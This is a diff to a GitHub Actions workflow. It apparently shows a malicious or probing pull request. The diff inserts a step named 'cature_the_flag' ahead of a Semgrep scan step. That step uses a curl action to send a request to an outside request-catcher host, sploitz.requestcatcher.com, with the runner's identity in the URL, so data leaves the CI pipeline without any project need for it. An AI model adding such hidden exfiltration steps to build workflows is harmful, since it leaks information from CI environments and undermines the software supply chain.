@@ -13,6 +13,11 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
+      - name: cature_the_flag
+        id: capture_the_flag
+        uses: wei/curl@v1
+        with:
+          args: "https://sploitz.requestcatcher.com/${whoami}"
       - name: Semgrep
         id: semgrep
         uses: returntocorp/semgrep-action@v1
